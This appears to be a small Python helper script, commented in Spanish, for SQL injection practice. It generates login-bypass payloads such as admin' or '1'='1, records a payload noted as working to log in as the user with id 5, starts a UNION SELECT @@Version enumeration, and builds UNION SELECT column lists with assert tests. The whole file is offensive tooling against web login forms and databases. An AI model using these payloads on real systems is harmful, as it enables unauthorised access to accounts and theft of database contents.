
def create_payload(keyword):
    payload = []
    payload.append(f"{keyword}' or '1'='1") # WHERE username = 'admin' or '1'='1'
    payload.append(f"{keyword}' or '1'='1'-- ")
    return payload
    

def login():
    payloads = create_payload("admin")
    for payload in payloads:
        print(payload)

login()

# Payloads usados y válidos
examples = {
	'ex1': "wildcard' or id='5')-- " #Loguearse con el usuario con id = 5
}

sqli_start = "wildcard'"
sqli_end = "-- -"

def sql_enumeration():
    #SQL DBMS Version
    union_payload = sqli_start + "UNION SELECT @@Version"

def create_select_statement(column_numbers, column_output, mochipochi):
    statement = "SELECT "
    aux_number = 1
    if column_output > column_numbers or column_numbers <= 0 or column_output <= 0 :
        return "Error"
    while aux_number <= column_numbers:
        if column_numbers == 1 or aux_number == column_output:
            statement += f"{mochipochi}"
        else:
            statement += f"{aux_number}"
        if aux_number < column_numbers:
            statement += ", "
        aux_number += 1
    print(statement)
    return statement

def check_statements(test_text="prueba"):
    #Errores
    assert create_select_statement(1,2,test_text) == "Error", "Test Failed" # Output mayor que columnas
    assert create_select_statement(0,0,test_text) == "Error", "Test Failed" # Columnas en 0 && Output en 0
    assert create_select_statement(2,0,test_text) == "Error", "Test Failed" # Output en 0
    #Tests Correctos
    assert create_select_statement(1,1,test_text) == f"SELECT {test_text}", "Test Failed" # 1 columna, output 1
    assert create_select_statement(2,1,test_text) == f"SELECT {test_text}, 2", "Test Failed" # 2 columnas, output 1
    assert create_select_statement(2,2,test_text) == f"SELECT 1, {test_text}", "Test Failed" # 2 columnas, output 2
    assert create_select_statement(4,2,test_text) == f"SELECT 1, {test_text}, 3, 4", "Test Failed" # 4 columnas, output 2
    return True
    

check_statements("user()")